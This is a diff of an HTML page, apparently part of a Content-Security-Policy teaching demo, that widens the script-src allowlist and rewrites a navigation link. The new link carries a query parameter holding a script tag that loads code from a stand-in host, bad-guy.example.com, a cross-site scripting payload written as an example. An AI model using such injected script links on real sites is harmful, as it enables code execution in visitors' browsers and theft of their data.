@@ -18,7 +18,7 @@
         -->
         <meta
             http-equiv="Content-Security-Policy"
-            content="script-src 'self' https://code.jquery.com"
+            content="script-src 'self' https://code.jquery.com https://cdn.jsdelivr.net"
         />
         <script src="/js/index.js"></script>
         <script src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"></script>
@@ -89,6 +89,10 @@
             console.log("from eval", eval("2 + 2"));
         </script>
 
-        <a href="/csp-unsafe-inline" class="next">Next Setting - Unsafe-inline </a>
+        <a
+            href='/csp-unsafe-inline?query=<script%20src="https://bad-guy.example.com/bad-stuff.js"></script>'
+            class="next"
+            >Next Setting - Unsafe-inline
+        </a>
     </body>
 </html>
